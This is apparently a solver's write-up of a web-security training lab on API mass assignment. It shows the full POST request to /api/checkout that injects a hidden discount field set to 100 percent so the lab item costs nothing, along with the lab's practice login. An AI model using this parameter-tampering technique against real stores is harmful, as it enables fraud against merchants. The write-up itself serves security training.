---
tags:
  - api
  - mass-assignment
---
# Exploiting a mass assignment vulnerability

## Instructions

To solve the lab, find and exploit a mass assignment vulnerability to buy a **Lightweight l33t Leather Jacket**. You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

Notice what happens if we try to check out normally without having sufficient store credit:

![](attachments/api-lab-4/file-20251114143913763.png)

The /api/checkout endpoint returns some useful information. 

We can take that information, and plug it into a POST request to /api/checkout, setting the discount percentage to 100, thereby giving us a free jacket!

```text title="Final request to solve the lab"
POST /api/checkout HTTP/1.1
Host: 0af2003003ca0bff80417c5900da0031.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0af2003003ca0bff80417c5900da0031.web-security-academy.net/cart
Content-Type: text/plain;charset=UTF-8
Content-Length: 53
Origin: https://0af2003003ca0bff80417c5900da0031.web-security-academy.net
Connection: keep-alive
Cookie: session=OEqAEgzDEiOZhqq1cae5i1pXAT7Hcwy3
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: magenta
Priority: u=0

{"chosen_products":[{"product_id":"1","quantity":1}],"chosen_discount": {
        "percentage": 100
    }}
```

Follow the redirect and solve the lab.

## Lesson learned

Keep a close eye on application responses to see if there are any hidden parameters disclosed. If there are, try sending those in requests to see if the application behavior changes at all.